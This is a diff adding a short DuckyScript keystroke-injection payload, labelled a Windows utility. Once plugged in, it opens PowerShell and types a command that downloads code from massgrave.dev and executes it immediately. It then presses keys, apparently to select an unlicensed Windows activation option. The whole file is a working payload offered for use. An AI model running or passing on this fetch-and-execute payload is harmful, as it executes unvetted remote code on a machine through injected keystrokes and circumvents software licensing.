@@ -1,0 +1,17 @@
+REM Title: Microsoft Activation Scripts
+REM Author: neverfa11ing
+REM Target: Windows 10/11
+REM Version: 1.0
+REM Category: Utilities
+REM
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING irm https://massgrave.dev/get | iex
+ENTER
+DELAY 6000
+LEFTARROW
+DELAY 500
+ENTER
